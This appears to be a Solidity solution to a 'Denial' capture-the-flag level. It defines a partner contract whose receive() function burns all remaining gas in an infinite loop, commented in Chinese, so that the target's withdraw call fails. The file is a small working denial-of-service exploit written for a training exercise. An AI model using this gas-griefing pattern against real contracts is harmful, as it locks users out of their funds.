pragma solidity ^0.8.0;
import {Test, console2} from "forge-std/Test.sol";

import {Denial} from "./Denial.sol";

contract DenialPartner {
    Denial private _denial;
    uint256 private _gasNeed;
    constructor(address payable _denialAdd) {
        _denial = Denial(_denialAdd);
    }

    receive() external payable {
        console2.log("2:", gasleft());

        // 消耗掉所有gas值
        while(true) {
        }
    }
}
